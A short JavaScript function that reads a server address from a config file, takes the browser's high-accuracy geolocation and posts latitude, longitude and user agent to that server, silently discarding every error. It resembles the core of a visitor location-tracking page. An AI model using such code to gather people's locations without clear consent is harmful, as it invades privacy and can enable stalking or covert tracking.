function sendLocation() {
    // Fetch the server configuration
    fetch('/config.json')
        .then(response => response.json())
        .then(config => {
            const serverUrl = `https://${config.server_ip}:${config.server_port}/location`;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function (position) {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const userAgent = navigator.userAgent; // Get browser and device details

                        // Send location and device details to the server
                        fetch(serverUrl, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                latitude: latitude,
                                longitude: longitude,
                                userAgent: userAgent
                            })
                        })
                        .then(response => {
                            if (!response.ok) {
                                throw new Error(`HTTP error! status: ${response.status}`);
                            }
                            return response.json();
                        })
                        .catch(() => {
                            
                        });
                    },
                    function () {
                        
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000, // 10 seconds
                        maximumAge: 0
                    }
                );
            }
        })
        .catch(() => {
            // Silently handle configuration fetch errors
        });
}